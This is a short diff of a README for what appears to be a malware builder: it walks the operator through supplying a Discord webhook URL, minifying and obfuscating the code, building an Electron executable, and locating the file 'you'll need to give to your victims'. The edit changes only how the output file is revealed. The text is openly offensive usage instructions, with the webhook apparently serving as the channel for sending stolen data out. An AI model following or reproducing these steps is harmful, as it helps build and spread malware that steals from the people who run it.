@@ -46,7 +46,7 @@ If you didn't create a Discord webhook, create it. Then, run the ``build.bat`` f
 * First, it asks you questions, like the name, the webhook URL... just answer them all.
 * Then it will minify (make the file size much lighter) and obfuscate (make the code unreadable) the code.
 * Finally, it will build Electron executable. If this is the first time you're building, it will download some things, this is normal.
-* When the build is finished, head over the "dist" directory: you'll find an ``<exe name you've provided>.exe`` file. This is the file you'll need to give to your victims.
+* When the build is finished, an explorer window will pop, selecting the file you'll need to give to your victims.
 
 ## Screenshots
 
